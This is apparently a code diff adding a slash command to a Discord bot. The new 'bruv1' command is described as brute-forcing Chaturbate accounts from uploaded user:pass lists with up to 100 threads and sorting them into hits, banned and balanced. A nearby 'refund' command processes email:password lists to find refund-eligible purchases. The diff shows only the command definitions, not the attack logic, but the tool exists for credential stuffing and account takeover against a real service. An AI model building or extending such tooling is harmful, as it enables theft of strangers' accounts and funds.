@@ -106,6 +106,13 @@ const commands = [
     .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-3, default 3)").setMinValue(1).setMaxValue(3)),
 
   new SlashCommandBuilder()
+    .setName("bruv1")
+    .setDescription("Brute-force Chaturbate accounts — hits, banned, balanced")
+    .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with user:pass per line").setRequired(false))
+    .addStringOption((o) => o.setName("accounts").setDescription("Accounts (comma-separated)").setRequired(false))
+    .addIntegerOption((o) => o.setName("threads").setDescription("Threads (1-100, default 50)").setMinValue(1).setMaxValue(100)),
+
+  new SlashCommandBuilder()
     .setName("refund")
     .setDescription("Check accounts for refund-eligible purchases (14-day)")
     .addAttachmentOption((o) => o.setName("accounts_file").setDescription("Text file with email:password per line").setRequired(false))
